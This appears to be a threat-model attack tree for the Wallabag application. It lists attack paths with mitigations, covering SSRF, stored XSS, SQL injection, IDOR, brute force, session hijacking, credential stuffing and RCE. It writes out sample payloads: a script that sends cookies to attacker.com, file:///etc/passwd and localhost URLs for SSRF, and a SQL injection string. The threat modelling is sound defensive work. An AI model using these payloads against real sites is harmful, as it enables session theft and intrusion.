## Attack Tree Path: [1.1.1 Server-Side Request Forgery (SSRF)](./attack_tree_paths/1_1_1_server-side_request_forgery__ssrf_.md)

*   **Description:** The attacker crafts a malicious URL that, when fetched by Wallabag, causes the server to make requests to unintended destinations. This can be used to access internal network resources, read local files, or interact with internal services.
*   **Example:**  An attacker saves an article with a URL like `http://localhost:22` or `file:///etc/passwd`.
*   **Mitigation:**  Strict URL validation (whitelist of allowed domains/IPs), network segmentation, avoid making requests to internal resources.

## Attack Tree Path: [1.1.2 Cross-Site Scripting (XSS) - Stored](./attack_tree_paths/1_1_2_cross-site_scripting__xss__-_stored.md)

*   **Description:** The attacker injects malicious JavaScript code into the content of a saved article. When another user views the article, the script executes in their browser, allowing the attacker to steal session cookies, redirect the user, or deface the page.
*   **Example:** An attacker saves an article containing `<script>document.location='http://attacker.com/?cookie='+document.cookie</script>`.
*   **Mitigation:**  Robust HTML sanitization (whitelist-based), Content Security Policy (CSP), HttpOnly and Secure flags on cookies.

## Attack Tree Path: [1.2.1 SQL Injection](./attack_tree_paths/1_2_1_sql_injection.md)

*   **Description:** The attacker crafts input that, when used in a database query, alters the query's logic. This can allow the attacker to extract data, modify data, or even execute arbitrary SQL commands.
*   **Example:**  If a search feature doesn't use parameterized queries, an attacker might enter a search term like `' OR 1=1; --`.
*   **Mitigation:**  Use parameterized queries or a secure ORM for all database interactions.

## Attack Tree Path: [1.2.2 Insecure Direct Object References (IDOR)](./attack_tree_paths/1_2_2_insecure_direct_object_references__idor_.md)

*   **Description:** The attacker manipulates identifiers (e.g., article IDs, user IDs) in requests to access resources they are not authorized to access.
*   **Example:**  An attacker changes the `article_id` parameter in a URL from `123` (their article) to `456` (another user's article) and gains access.
*   **Mitigation:**  Implement robust authorization checks to verify that the user is permitted to access the requested resource.

## Attack Tree Path: [1.3.1 Brute-force/Dictionary Attack](./attack_tree_paths/1_3_1_brute-forcedictionary_attack.md)

*   **Description:** The attacker attempts to guess a user's password by trying many different combinations (brute-force) or using a list of common passwords (dictionary attack).
*   **Example:**  Using automated tools to try thousands of password combinations against a user's account.
*   **Mitigation:**  Strong password policies, account lockout after failed attempts, rate limiting, CAPTCHAs.

## Attack Tree Path: [1.3.2 Session Fixation/Hijacking](./attack_tree_paths/1_3_2_session_fixationhijacking.md)

*   **Description:**
    *   **Session Fixation:** The attacker tricks a user into using a known session ID, allowing the attacker to take over the session.
    *   **Session Hijacking:** The attacker steals a valid session ID (e.g., through XSS) and uses it to impersonate the user.
*   **Example:**  (Fixation) Sending a user a link with a pre-set session ID. (Hijacking) Stealing a session cookie via XSS.
*   **Mitigation:**  Use secure, randomly generated session IDs, HttpOnly and Secure flags on cookies, session timeouts, proper session invalidation, regenerate session ID after login.

## Attack Tree Path: [1.4.3 IDOR on API endpoints](./attack_tree_paths/1_4_3_idor_on_api_endpoints.md)

*   **Description:** Similar to 1.2.2, but specifically targeting API endpoints. The attacker manipulates IDs in API requests.
    *   **Example:** Changing a user ID in an API call to retrieve another user's data.
    *   **Mitigation:**  Strict authorization checks on all API endpoints, validating that the authenticated user has permission to access the requested resource.

## Attack Tree Path: [2.5 Credential Stuffing](./attack_tree_paths/2_5_credential_stuffing.md)

*   **Description:** The attacker uses credentials (username/password combinations) that have been leaked from other breaches to try to gain access to Wallabag accounts.
*   **Example:**  Using a database of leaked credentials from a different website to try to log in to Wallabag.
*   **Mitigation:**  Rate limiting, CAPTCHAs, monitoring for unusual login patterns, encouraging users to use unique passwords.

## Attack Tree Path: [3.1 SSRF (leading to System Compromise)](./attack_tree_paths/3_1_ssrf__leading_to_system_compromise_.md)

*   **Description:**  As described in 1.1.1, but with the added impact of potentially escalating to full system compromise by exploiting vulnerabilities in internal services.
*   **Example:**  Using SSRF to access an internal database with a known vulnerability, leading to remote code execution.
*   **Mitigation:**  Same as 1.1.1, plus strong network segmentation and security hardening of internal services.

## Attack Tree Path: [3.2 Remote Code Execution (RCE)](./attack_tree_paths/3_2_remote_code_execution__rce_.md)

*   **Description:** The attacker exploits a vulnerability to execute arbitrary code on the server. This is the most severe type of vulnerability, as it gives the attacker complete control.
*   **Example:**  Exploiting a vulnerability in a PHP library used by Wallabag to upload and execute a malicious PHP script.
*   **Mitigation:**  Keep all software up-to-date, use secure coding practices, run Wallabag with the least necessary privileges, use a WAF and IDS.
